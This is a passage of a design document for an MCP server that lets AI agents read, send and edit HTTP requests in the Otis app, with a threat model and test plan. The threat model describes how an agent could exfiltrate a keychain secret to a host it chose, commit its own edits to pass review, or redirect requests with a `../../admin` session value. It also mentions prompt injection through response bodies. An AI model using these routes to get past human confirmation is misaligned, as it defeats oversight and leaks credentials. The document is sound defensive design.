**`get_request`** — one request, as it would be sent *and* as it is written.
`{ path: string, environment?: string }` →
`{ path, name, method, url, headers: [{ name, value, source, inherited }],
   auth: { kind, source, secret }, body: { kind, contentType, preview },
   variables: [{ name, resolved, origin, secret }], warnings: [],
   source: string, gitStatus: "clean" | "modified" | "untracked" }`
Effective values with provenance, because the agent should see what will happen
— the same thing the editor shows a person. `body.preview` is capped at 4 KB
and `resolvedUrl` is masked.

`source` is the file's own text, unresolved, and it exists so that
`update_request` can be a read-modify-write on the real bytes rather than a
reconstruction from a summary (§14.8). It is masked like everything else, which
matters here: a `.http` file can contain a literal credential somebody
committed, and this tool must not be the way an agent reads one.

`gitStatus` is included because it is what decides how a send will be gated
(§5), and an agent that can see it can tell a person "this will need your
confirmation" before spending a turn finding out.

**`list_environments`** —
`{ environments: [{ name, description, active, confirmBeforeSend, agents,
   variables: [{ name, secret }] }] }`
Names and shapes. Never a value, secret or not — an environment's non-secret
values are still somebody's infrastructure.

**`get_session_variables`** — what runs have set (§8).
`{ folder?: string }` → `{ variables: [{ name, value, scope, owner, setBy, at,
secret }] }`. `value` is withheld when `secret`.

**`get_last_response`** — the held response, paged.
`{ sendId?: string, offset?: number, limit?: number }` →
`{ status, statusText, headers, timing, size, body: { lines, offset, total,
truncated } }`
Paged for the reason the window pages it: a body never crosses a boundary
whole. `limit` defaults to 200 lines and is capped at 1000. Omitting `sendId`
means the most recent send.

**`get_test_results`** — assertions from a send or run.
`{ sendId?: string }` → `{ passed, failed, tests: [{ name, ok, message }] }`

### RUN

Both are two-phase on every client (§6.2). `intent` is what distinguishes the
phases, and there is no shape of call that skips phase 1.

**`send_request`** — send one request.
`{ path: string, environment?: string, intent?: string }`
- **without `intent`** → `{ intent, expiresAt, method, resolvedUrl,
  environment, usesSecret, secrets: [name], reviewed, willAsk }`. Nothing is
  sent and nobody is asked.
- **with `intent`** → the person is asked (§6.3, §6.4), then
  `{ sendId, status, statusText, timing, size, resolvedUrl,
  tests: { passed, failed }, sessionVariablesSet: [{ name, scope, owner }] }`.

Naming an `environment` is allowed and is policy-checked like any other; it
does not change the app's active environment, because an agent must not be able
to silently repoint the human's next send. It is part of the fingerprint, so an
intent taken for one environment cannot be spent against another.

**`run_folder`** — run a folder in order.
`{ path: string, stopOnFailure?: boolean, intent?: string }`
- **without `intent`** → the plan, and every request's preview. That is the
  useful shape anyway: it is what tells an agent how many confirmations it is
  about to ask a person for.
- **with `intent`** → `{ runId, results: [{ path, status, tests }],
  summary: { sent, passed, failed } }`.

One intent covers the run, because the plan is what was previewed. The person
is still asked **per request** (§6.5): the agent previewing a folder once does
not confirm anything on anybody's behalf.

### WRITE

Every one of these goes through the service `CLAUDE.md` already names as the
only writer of that kind of file, so an agent's write is subject to the same
invariants a person's is: it holds the write guard, it is atomic, it announces
itself, and **it does not touch `.order`**.

Everything written here is unreviewed by definition, so §5 applies to it
immediately: sending it will confirm, and will be refused if it would use a
secret.

**`create_request`** — a new request file.
`{ folder: string, name: string, text?: string }` → `{ path, slug }`
`RequestService.Create`, which names the file for the slug of `name` and keeps
`name` verbatim as the `# @name` directive (`FORMAT.md` §7). `text`, if given,
replaces the default body and must parse. `path` is the node path Go actually
used — it may carry a `-2` the agent did not ask for, and the agent must use
what comes back.

**`create_folder`** — a new folder.
`{ parent: string, name: string }` → `{ path, slug }`
`FolderService.Create`, which also writes the `_folder.http` that makes git
track the directory.

**`update_request`** — replace a request's text.
`{ path: string, text: string }` → `{ path, status: "modified" }`
`RequestService.SaveText`, which refuses text that does not parse.

Whole-file replacement rather than a structured patch (§14.8): the file *is*
the format, so an agent that reads `get_request.source` and writes
`update_request.text` round-trips through exactly what a person edits, and a
patch API would be a second answer to what a request is. The risk that comes
with it — an agent rewriting a file can drop a comment or a script it did not
understand — is why `source` exists, and what survives shows up in the diff
like any other change.

A script an agent writes is worth a sentence, since `update_request` can carry
one: it runs in the same sandbox as any other (`FORMAT.md` §9.3 — no
filesystem, no process, no network, no timers) and sees a secret only as an
opaque handle, so it is not a way around §7 either.

### SESSION

**`set_session_variable`** — set one session value for a folder (§8.1).
Two-phase, like the mutating tools of RUN.
`{ folder: string, name: string, value: string, intent?: string }` →
phase 1 `{ intent, folder, name, shadows: string | null, reaches: number }`,
phase 2 `{ set: true, folder, name, scope: "folder" }`

**Refused if the name already resolves** at that folder through a request
`@var`, any `_folder.http` above it, or the active environment — a session
value outranks all three (`FORMAT.md` §4.2), so allowing it would be an
environment write by another name. **Always confirmed in Otis' window**,
whatever the environment policy says, because a value in no file is
permanently unreviewed. §8.1 has the whole argument.

### Not exposed, on purpose

- **No rename and no delete.** Creating and editing are recoverable — the file
  is in the working tree and `git checkout` undoes it. A delete of something
  uncommitted is not, and neither is a rename that loses history. Nothing an
  agent does should be unrecoverable by the tools the person already has.
- **No environment writes.** No tool creates an environment, changes a
  variable, or edits `$otis` — the last of which would let an agent grant
  itself permission.
- **No `.order` writes.** Reordering is a human preference and `order.go`
  stays the only writer.
- **No secret access of any kind**, read or write.
- **No git.** No commit, stage, or discard. `internal/diff` is the only thing
  that writes to a repository and it stays a human affordance. This one matters
  more now that WRITE exists: an agent that could commit could make its own
  writes "reviewed" and walk straight through §5.
- **No `clear_session`.** Reaching into the human's session state to destroy it
  is not something an agent needs. Note the asymmetry with §8.1's
  `set_session_variable`, which is deliberate: setting a name nothing else
  defines adds a value a person authorized, and clearing destroys values a
  person's own runs produced. One is additive and gated; the other is
  somebody else's state.
- **No collection creation, and no switching collections.** Every other tool is
  scoped to the open collection, and that scope is what bounds them all. A tool
  that created one would have no scope — it is arbitrary directory creation at
  a path the agent chooses. A tool that switched one would change which
  keychain entries resolve, since a secret is keyed
  `<collection>/<env>/<name>` (`FORMAT.md` §5). Neither is built for a person
  yet either: Clone and Start fresh are `soon` in the empty state and
  `DESIGN-NOTES` §9.9 records that they are not in the A–E plan.

**The boundary, stated plainly.** With WRITE off, an agent can send only what
is in the collection, which means only what somebody reviewed. With WRITE on,
an agent can compose a request — but it cannot send that request without a
person reading the resolved URL, and it cannot send it *at all* if a secret is
involved. What an agent can never do is send a credential somewhere a human
did not put in a committed file.

That is a weaker boundary than "cannot compose", and the trade is deliberate:
in exchange, an agent can scaffold the boring half of a collection. The thing
that has to hold for the trade to be sound is §5, which is why it is enforced
by `git status` rather than by policy.

## 13. What this protects against, and what it does not

**Does:**
- Ask a person before a send that policy says needs asking — through their own
  client where it can (§6.3), and in Otis' window where that is the only
  trustworthy place (§6.4).
- An agent reading a secret value — architecturally, not by policy (§7).
- An agent sending to production without a person seeing it (§4, §6).
- Another process or user on the machine driving it — token, loopback bind.
- A web page driving it through your browser — `Origin` and `Host` checks.
- An agent sending a secret without a person seeing the request that carries it
  (§5.1) — in the window, with the diff, the destination in the button and the
  secret named.
- An agent making its own writes look reviewed: it cannot commit, stage or
  discard (§12).
- Runaway loops — rate limits, and a kill switch that means it.

**Does not:**
- **A malicious agent within its grant.** If you enable RUN and mark an
  environment `"allow"`, an agent can send those requests as fast as the rate
  limit permits. That is the grant working, not failing. §6.2's two-phase send
  does **not** change this: an agent will echo an intent back without a
  thought. Its value is that the target reaches the transcript, not that it
  stops anything. If you do not trust the committed `"allow"`, the control is
  `mcp.alwaysConfirmSends` (§4 rule 4), which is a human gate and does stop
  things.
- **An agent changing a request you already reviewed.** With WRITE on, it can.
  §5 means it cannot then *send* it without you reading the resolved URL, and
  the change shows up as an `M` in the tree and in the diff — but the file did
  change under you, and if you commit without reading the diff you have
  reviewed nothing. This is the cost of the WRITE grant and there is no
  mechanism here that removes it.
- **A session value steering a reviewed request within its own host.** §8.1's
  rule 1 stops a session write from redirecting a request, by refusing any name
  the collection already defines. It does not stop the value from doing work
  where it lands: `orderId` set to `../../admin` turns
  `{{baseUrl}}/orders/{{orderId}}` into `{{baseUrl}}/admin`. The bound is that
  it stays on the host and the credential the reviewed request already used —
  so it is the API's own authorization deciding — and that a person read the
  value when they authorized the set. Smaller than the redirect rule 1 removes;
  not zero.
- **A confused person clicking through confirmations.** A prompt is only as
  good as its reading, which is why the confirmation names the method, the
  resolved URL and the environment rather than asking "allow?".
- **A client configured to auto-approve tools.** Real clients offer "always
  allow this tool", and a person may click it while approving something
  harmless. That is precisely why the tool annotations of §6.1 are not treated
  as the gate, and why the two cases in §6.4 are answered in Otis' own window,
  which no client preference can reach. And because
  `mcp.alwaysConfirmSends` defaults on (§4 rule 4), a client that
  auto-approves every tool still cannot make a send happen without somebody
  answering somewhere.
- **Anything a request itself does.** Otis sends what the collection says. A
  reviewed request that deletes a production table will delete it.
- **A person approving §5.1's dialog without reading it.** This is the
  design's sharpest residual risk and it is a deliberate trade (§14.7): an
  unreviewed send that uses a secret is *confirmed*, not refused, so an agent
  that writes `Authorization: Bearer {{apiKey}}` pointed at a host it chose is
  one careless click from succeeding. Everything §5.1 does — the destructive
  treatment, the diff, the host in the button, Refuse focused — is spent making
  that click hard to make by accident. None of it makes it impossible.
- **Another local process reading `mcp.json`.** It is mode `0600`, which stops
  other *users*, not other processes running as you. A local attacker with your
  uid has your keychain anyway.
- **Prompt injection reaching the agent through a response body.** A response
  can carry text that tries to instruct the agent. Otis cannot prevent that and
  should not pretend to; what it can do is make sure the *next* action still
  needs the same consent as the first, which is exactly why there is no
  session-wide approval.

## 14. Decisions

All twelve are settled and struck through, with the reasoning kept so a later
reader sees what was decided and why rather than re-opening it.

Three went against my recommendation, and §14.7 is the one that moved the
design's safety rather than its shape — it is flagged in §13 as the residual
risk for that reason. The last five were delegated rather than argued: asked
to take my own recommendations, I took all five unchanged, so each is marked
**Decided as recommended** and the reasoning below is the recommendation's,
now load-bearing.

1. ~~Port and token stability?~~ **Decided as recommended: unstable** (§2).
   An OS-assigned port and a token minted at startup, both changing every
   launch, with `otis mcp config` printing the block to paste. A fixed port is
   a worse security posture for a marginal convenience, and the convenience is
   bought back by one command.

   There is deliberately no `otis mcp serve`. The server runs in the app
   because everything that makes it safe is there — the window a confirmation
   appears in (§6.4), the open collection, the keychain — and a headless
   server would be a listener with no way to ask anyone anything, which is the
   shape this whole design refuses. `otis mcp config` says so when it finds no
   endpoint file, rather than reporting a missing file.
2. ~~Audit log persistence?~~ **Decided: a file** (§9.1), against my
   recommendation. `<config>/otis/mcp-audit.jsonl`, on by default, capped and
   rotated, `0600`, never inside the collection, with a test asserting nothing
   sensitive reaches a line. The reasoning that won: a readout you lose on quit
   answers "what is this agent doing" but not "what did it do last Tuesday",
   and the second is the question an audit log exists for. The cost is a
   durable record of which endpoints you called, which is why the off switch
   is part of the design.
3. ~~The indicator's colour and place?~~ **Decided as recommended: the title
   strip, in amber** (§11), written up as `DESIGN-NOTES` §9.22 rather than
   settled here, because it is a visual decision and that is where those live.
   Amber because the design already spends red on destruction and emerald on
   success, and "something else can drive this window" is neither — it is a
   state to be aware of, which is what amber is for.
4. ~~`agents` default?~~ **Decided: `"confirm"`** (§4). `"deny"` is safer but
   makes RUN useless until every environment is annotated, and `"allow"` is
   indefensible. An environment that says nothing gets a person in the loop;
   opting out is the deliberate act.
5. ~~Confirmation timeout?~~ **Decided as recommended: 60 seconds** (§6),
   and the same 60 seconds bounds an intent (§6.2) — one number, because a
   preview that outlived the dialog it leads to would be a second answer to
   "how long is this offer good for". Longer leaves dialogs standing on a
   screen nobody is at; shorter makes a person race a timer they did not
   start. A timeout is logged as `timed-out` and is a refusal, never a
   default-yes.
6. ~~Should RUN require READ?~~ **Decided as recommended: no.** An agent told
   exactly which request to send should not have to be given the run of the
   collection to send it. The capabilities are independent, and RUN alone is
   the tighter grant of the two — it can send what it is named, and cannot
   enumerate what else is there.
7. ~~Should an unreviewed send that uses a secret be refused, or confirmed with
   a louder dialog?~~ **Decided: confirmed**, against my recommendation
   (§5.1). The gain is real — an agent can iterate on a request that needs a
   credential, which a flat refusal made impossible. The cost is equally real
   and is now the design's residual risk (§13): a flat refusal became an
   informed decision, and a decision can be got wrong. §5.1 spends the
   difference on the dialog — destructive treatment, the diff of what the agent
   wrote, the destination in the button text, the secret named, Refuse
   focused — but it is a dialog. **This is the first thing to revisit if this
   ever goes wrong.**
8. ~~Should `update_request` take whole text or a structured patch?~~
   **Decided: whole text**, and the question deserved a better explanation than
   it got. The two shapes were:

   - **Whole text** — `update_request { path, text }`. The agent sends the
     entire `.http` file as a string and Otis parses it, refuses it if it does
     not parse, and writes it. One code path, `RequestService.SaveText`, which
     already exists and already validates.
   - **Structured patch** — something like
     `update_request { path, setHeader: {…}, setMethod: "POST", setBody: "…" }`.
     Otis applies the changes to the parsed model. Surgical: it cannot disturb
     anything the agent did not mention.

   The patch shape is safer in one specific way — an agent rewriting a whole
   file can drop a comment, a directive or a script it did not understand — and
   worse in a structural way: it is a second answer to "what is a request",
   which is the mistake `FORMAT.md` §1.13 exists to prevent, and it needs an
   API surface mirroring every part of the model.

   Text wins **provided the agent can read the real file first**, which the
   proposal did not allow for: `get_request` returned *effective* values with
   provenance, not the source. So `get_request` now returns `source` (§12), and
   the round trip is read-modify-write on the actual bytes rather than a
   reconstruction from a summary. That removes most of the clobbering risk, and
   what remains is visible in the diff like any other change.

   The deciding reason, stated as it was given: **do not complicate the API
   for now.** One tool taking one string beats a surface that mirrors every
   part of the model, and the escape hatch is cheap — a patch tool could be
   added later beside `update_request` without changing it, since the two would
   not conflict. The signal to revisit is agents actually losing comments,
   directives or scripts in practice, which verification step 32 measures.
9. ~~Should WRITE be allowed in a collection with uncommitted changes already
   present?~~ **Decided as recommended: yes, with no special case.** Those
   files are unreviewed like any other and §5 already covers them: an
   unreviewed request cannot be sent to production without the confirmation,
   whoever left it unreviewed. A special case here would mean an agent's
   behaviour depended on whether *you* had committed your own work, which is
   a rule nobody could predict from the outside — and it would push people
   toward committing to clear it.
10. ~~Should two-phase apply to every client, or only to ones that cannot be
    asked?~~ **Decided: every client** (§6.2). The deciding argument was the
    one against my own recommendation — with two phases everywhere there is no
    code path in which a single tool call sends anything, which makes it a
    property rather than a configuration, and a gate that exists only for some
    clients is a gate you have to reason about per client. The cost is one
    round trip on an operation that already involves the network, and a doubled
    tool-call count for clients billed by it.
11. ~~Should elicitation be allowed to answer the §6.4 cases too?~~
    **Decided: no** (§6.4). Production, unreviewed sends and
    stay in the window. It is the one surface no client preference can
    auto-approve, and the brief asked for an in-app confirmation on production
    specifically. (The third case this once listed —
    `alwaysConfirmSends` — was dropped when it became a default; §6.4 says
    why.)

    Worth noting this is the one place the design is deliberately *not*
    uniform, having just chosen uniformity for two-phase (§14.10). The
    difference is what uniformity would buy: making two phases universal
    removes a code path, while making elicitation universal would remove the
    only confirmation surface a client cannot auto-approve. The first
    simplifies, the second weakens. The cost is a context switch on exactly
    the sends where a context switch is cheap relative to the mistake.
12. ~~Should `mcp.alwaysConfirmSends` default on rather than off?~~
    **Decided: on** (§4 rule 4). Every agent send asks until somebody turns it
    off, which means a committed `"allow"` is a statement about the
    environment rather than a grant that takes effect unasked.

    Deciding this changed §6.4: the setting used to force the confirmation into
    Otis' window, on the reasoning that turning it on was a deliberate act.
    A default is not a deliberate act, and keeping that link would have made
    every send window-only out of the box — leaving elicitation reachable only
    by *weakening* a safety setting. So the setting now decides whether a
    person is asked, and §6.4 decides where. A user who wants every
    confirmation in the window regardless has no switch for that today; if
    somebody asks, it is a second setting rather than a change to this one.

## 15. Verification plan

The brief's list, plus what §7 demands:

1. Connect from Claude Code; exercise every READ tool.
2. Call `send_request` with RUN disabled → refused, naming the capability.
3. Call `send_request` against a `confirmBeforeSend` environment → blocks,
   dialog names method/URL/environment, refusal reaches the agent as an error.
4. Same against `"agents": "deny"` → refused without a dialog.
5. **No secret value in any tool result.** Point a request at an endpoint that
   echoes its request headers, with a keychain-backed bearer token, and assert
   `•••••` in the response body the agent receives. This is the test that would
   catch the worst possible bug and it should exist before anything else does.
6. Multi-step: `send_request` sets a session variable, a second consumes it
   (§8), and the value never appears in the first result.
7. Kill switch mid-session → the next call fails authentication, an in-flight
   send is cancelled, `mcp.json` is gone.
8. Rate limit: exceed RUN's bucket → error, logged as `rate-limited`, and a
   refused confirmation does not consume budget.
9. `Origin: https://evil.test` → rejected. No token → rejected. `0.0.0.0`
   never appears in a bind.
10. Audit log contains every one of the above with the right `decision`, and no
    body, header or secret.
11. **The write gate.** With WRITE and RUN on and the environment marked
    `"allow"`: `create_request` a request pointing at an `httptest` server with
    an `Authorization: Bearer {{apiKey}}` header, then `send_request` it →
    **the §5.1 danger confirmation, in the window, and nothing sent until it is
    answered**. Assert the dialog names the destination host and the secret,
    that an elicitation `accept` does not satisfy it, and that the timeout
    refuses. This is the exfiltration attempt from §5 and after §14.7 it is
    gated by a person rather than by a refusal — so the test is that the person
    is genuinely in the way, and that nothing reaches the network without them.
12. The same request without the secret header → confirmed, not sent silently,
    even though the environment says `"allow"`.
13. Commit the file, then send again → proceeds under the environment's policy.
    This is the whole gate: a commit is what makes it reviewed.
14. `update_request` on a clean, committed request → the file becomes `M`, the
    tree shows it, and the next send confirms.
15. `WRITE` cannot be enabled in a collection that is not a git repository, and
    READ and RUN still can.
16. No `rename`, `delete`, environment-write, `.order`-write, commit,
    `create_collection` or `open_collection` tool is registered at all — asserted
    against the registered tool list, so adding one later fails the test.
17. **Elicitation gates phase 2, on a client that supports it** (§6.3). A fake
    client declaring the capability: `send_request` *with* a valid intent
    against a `"confirm"` environment blocks on `elicitation/create`; `accept`
    proceeds; `decline` and `cancel` both refuse and are logged distinctly; no
    answer in 60s refuses. Assert against an `httptest` server that nothing was
    sent in every case but `accept`.
18. **Annotations are set** — `readOnlyHint` on every READ tool,
    `destructiveHint` and `openWorldHint` on the send tools — asserted against
    the registered tool list, so a new tool cannot arrive unannotated.
19. **Annotations are not load-bearing.** A client that ignores every
    annotation and calls `send_request` directly is still gated: the
    confirmation happens inside the handler, not in the client's decision to
    call.
20. **The §6.4 cases are not answerable through the client.** With
    `confirmBeforeSend: true`, an `accept` from elicitation does **not** send;
    only the in-app answer does. Same for an unreviewed send. And the converse:
    with `alwaysConfirmSends` on and an ordinary `"confirm"` environment,
    elicitation *can* answer — otherwise the default would make §6.3 dead
    code.
21. **Two-phase send, on every client** (§6.2). `send_request` without an
    `intent` sends nothing and asks nobody — asserted against an `httptest`
    server that records every hit, so "nothing was sent" is a fact and not an
    absence of evidence, and asserted against the fake client that no
    `elicitation/create` was issued either. The preview names the method,
    resolved URL and environment.
22. **The universality of it.** Run the phase-1-sends-nothing assertion against
    both a client that declares elicitation and one that does not, and against
    every environment policy including `"allow"`. This is the test that makes
    two phases a property rather than a configuration, which is the whole
    reason it applies everywhere.
23. **The audit file holds nothing sensitive** (§9.1). Drive every tool with a
    keychain-backed secret, a request body and a response body in play, then
    assert no line contains any secret value, request body, response body,
    header or file content. The sibling of the key index's own test, and for
    the same reason: the promise is worth more than the convenience of putting
    more in it.
24. The audit file is written to the config directory and **never inside the
    collection** — asserted by driving the tools and then checking `git status`
    on the collection is unchanged by logging alone.
25. It is capped and rotated: past 5 MB a new file starts and only one previous
    generation survives. And `mcp.persistAuditLog: false` writes no file at all
    while the in-app panel still lists the session's calls.
26. `surface` records where the person was actually asked, and is `window` for
    all three §6.4 cases even on a client that declares elicitation.
27. An intent is single-use: spending it twice fails the second time. An expired
    intent fails. An intent from a different request or environment fails.
28. **The fingerprint holds.** Preview a request, `update_request` its URL, then
    spend the intent → refused, and nothing is sent. This is the TOCTOU hole
    the binding exists to close and it is the test that proves it did.
29. A returned intent does **not** skip a human confirmation: with the
    environment on `"confirm"`, phase 2 still blocks on the dialog.
30. **`mcp.alwaysConfirmSends`** (§4 rule 4). Default on: a send against
    `"allow"` still asks. Turned off, the same send does not. And there is no
    setting or tool argument that turns a `"confirm"` or `"deny"` environment
    into an `"allow"` one — asserted by exhausting the effective policy
    function over every combination, so the "tighten only" rule is a test
    rather than a claim.
31. **`get_request.source` is masked** (§12). A committed `.http` file
    containing a literal credential is not a way for an agent to read one:
    assert the masker runs over `source` as it does over every other result.
32. **The round trip does not clobber.** `get_request.source` →
    `update_request` with one header changed → the file's comments, directives
    and scripts survive byte for byte. This is the risk §14.8 accepted, so it
    is the one to measure.

33. **§8.1's rule 1 is a rule, not a dialog.** `set_session_variable` for a
    name defined by the active environment, by a `_folder.http` above the
    target, and by the request file itself → refused in all three, each naming
    what it would have shadowed, and **no dialog raised** in any of them. The
    same name with that definition removed → allowed. And the check runs at
    *redeem*: preview a free name, define it in the environment, redeem →
    refused.
34. **Its confirmation is not answerable through the client** (§6.4), is raised
    even with the environment marked `"allow"`, and the timeout refuses. A
    `"deny"` environment refuses with no dialog.
35. **A session write cannot redirect a send.** The case §8.1 opens with: a
    committed, clean request at `{{apiHost}}/v1/orders`, `apiHost` from the
    environment, SESSION and RUN both on and the environment `"allow"` —
    assert against an `httptest` server that nothing reaches a host the agent
    named, and that the refusal happened at the *set* rather than at the send.
36. **The audit line for a set carries the name and the scope and no value**,
    asserted against the recorded entry.

Tests may not touch the network (`CLAUDE.md`), so 5 and 6 run against an
`httptest` server.

---

**1–32 are built and tested.** **33–36 are not**: §8.1 is the one part of this
document still at the proposal stage, written the same way the rest was —
to be approved, changed or rejected before any of it exists. Implement it in
the order §15 tests it, starting with 33, because rule 1 is the part whose
absence would be unrecoverable.

